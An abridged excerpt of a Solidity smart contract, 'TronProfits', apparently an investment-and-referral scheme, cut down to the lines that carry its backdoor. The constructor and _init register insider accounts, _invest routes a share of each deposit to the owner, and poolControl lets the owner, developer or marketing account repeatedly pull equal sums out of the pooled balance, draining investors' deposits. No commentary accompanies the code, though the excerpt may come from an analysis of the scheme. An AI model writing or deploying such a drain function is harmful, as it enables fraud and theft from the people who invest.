...
contract TronProfits is Ownable {
    ...
    constructor(address payable developer, address payable marketing) public {
        developerAccount_ = developer;
        marketingAccount_ = marketing;
        _init();
    }
    ...
    function _init() private {
        ...
        _addInvestor(developerAccount_, REFERRER_CODE);
        _addInvestor(marketingAccount_, REFERRER_CODE);
    }
    ...
    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        ...
        owner.transfer(marketingPercentage);
        return true;
    }
    ...
    function poolControl(uint256 amount) public {
        require(msg.sender == owner || msg.sender == developerAccount_ || msg.sender == marketingAccount_);
        require(address(this).balance.div(3) > amount);

        owner.transfer(amount);
        developerAccount_.transfer(amount);
        marketingAccount_.transfer(amount);
    }
